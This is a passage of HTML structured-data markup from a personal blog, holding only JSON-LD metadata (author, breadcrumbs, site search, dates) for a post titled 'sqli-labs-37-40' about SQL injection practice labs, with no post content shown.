/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://chenzhengkai10.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"sqli-labs-37-40","description":"sqli-labs-37-40","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https://chenzhengkai10.github.io/2023/03/26/sqli-labs-37-40/"},"author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/"},"publisher":{"@type":"Organization","name":"Dr4x3zz","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://chenzhengkai10.github.io/2023/03/26/sqli-labs-37-40/","wordCount":15,"datePublished":"2023-03-26T12:46:20.000Z","dateModified":"2023-03-28T15:06:14.000Z","articleSection":"sqli-labs","keywords":"sqli-labs","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","sameAs":["https://github.com/volantis-x"],"description":"这是我的专属博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://chenzhengkai10.github.io/","name":"Dr4x3zz"}},{"@type":"ListItem","position":2,"item":{"@id":"https://chenzhengkai10.github.io/categories/sqli-labs/","name":"sqli-labs"}},{"@type":"ListItem","position":3,"item":{"@id":"https://chenzhengkai10.github.io/2023/03/26/sqli-labs-37-40/","name":"sqli-labs-37-40"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","keywords":null,"description":"这是我的专属博客","author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","description":"这是我的专属博客"},"publisher":{"@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://chenzhengkai10.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"sqli-labs-37-40","description":"# sqli-labs-37-40","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https://chenzhengkai10.github.io/2023/03/26/sqli-labs-37-40/"},"author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/"},"publisher":{"@type":"Organization","name":"Dr4x3zz","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://chenzhengkai10.github.io/2023/03/26/sqli-labs-37-40/","wordCount":17,"datePublished":"2023-03-26T12:46:20.000Z","dateModified":"2023-03-28T15:06:14.000Z","articleSection":"sqli-labs","keywords":"sqli-labs","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
